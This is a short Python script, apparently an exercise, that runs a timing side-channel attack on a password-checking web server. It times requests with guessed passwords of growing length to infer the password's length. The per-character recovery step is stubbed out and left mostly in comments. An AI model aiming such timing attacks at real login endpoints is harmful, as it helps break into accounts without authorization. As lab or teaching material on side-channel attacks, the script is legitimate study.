import time
from statistics import stdev

import requests

# from HuckIt import find_pass_len, find_tav


def timeit(url2check, repeat=1):
    tt = []
    for _ in range(repeat):
        start = time.time()
        requests.get(url2check, allow_redirects=True)
        end = time.time()
        tt.append(end - start)
    return tt


def find_pass_len(url, MAX_LEN):
    time_values = []
    for num in range(1, MAX_LEN+1, 1):
        executed_url = url + '/' + ("").ljust(num, '*')# defining the password to sent
        time_values.append(min(timeit(executed_url, 5)))# add the time it took to the current password
        print(f'checking length: {num} the time it took: {time_values[-1]}')
        if num>4:
            standart_devitation = stdev(time_values)
            average = sum(time_values) / len(time_values)  # getting the average from the list
            possible_lens = []
            for curr_time in time_values:# running over the times to checks if there is one which unusual
                if curr_time - average > 1.5 * standart_devitation:
                    print(f'the difference is {curr_time - average}')
                    return time_values.index(curr_time)
        
    # standart_devitation = stdev(time_values)# getting the standart_devitation from the list
    # print(standart_devitation)
    average = sum(time_values)/len(time_values)# getting the average from the list
    possible_lens = []
    # for curr_time in time_values:# running over the times to checks if there is one which unusual
    #     if curr_time - average > 0.8 * standart_devitation:
    #         print(f'the difference is {curr_time - average}')
    #         return time_values.index(curr_time)

     #each time that the legnth is bigger than the right length the response time is raising so we want to return the first time it raised

def find_tav():
    time_values = []
    # while len(possible_lens) > 1:
    #     start_length = len(possible_len)
    #     for possible_len in possible_lens:
    #         executed_url = url + '/' + ("").ljust(possible_len, '*')  # defining the password to sent
    #         curr_time = min(timeit(executed_url, 5))
    #         if average - curr_time > standart_devitation:
    #             possible_lens.append(possible_len)
    #         print(f'checking length: {possible_len} the time it took: {curr_time}')
    #     possible_lens = possible_lens[start_length:]




if __name__ == '__main__':
    GAL_SITE = False

    if GAL_SITE:
        url = r'https://verifyserver.herokuapp.com/index'
        POOL = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
        # POOL_SHORT = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'

    else:
        url = "https://passwordserver.herokuapp.com/123"

        POOL = '0123456789'

    pswd_len = find_pass_len("https://passwordserver.herokuapp.com/", 10)
    print(pswd_len)
    # temp_pswd = ""
    # for i in range(pswd_len):
    #     temp_pswd += find_tav(pswd_len, temp_pswd)
    # print("the password is : " + temp_pswd)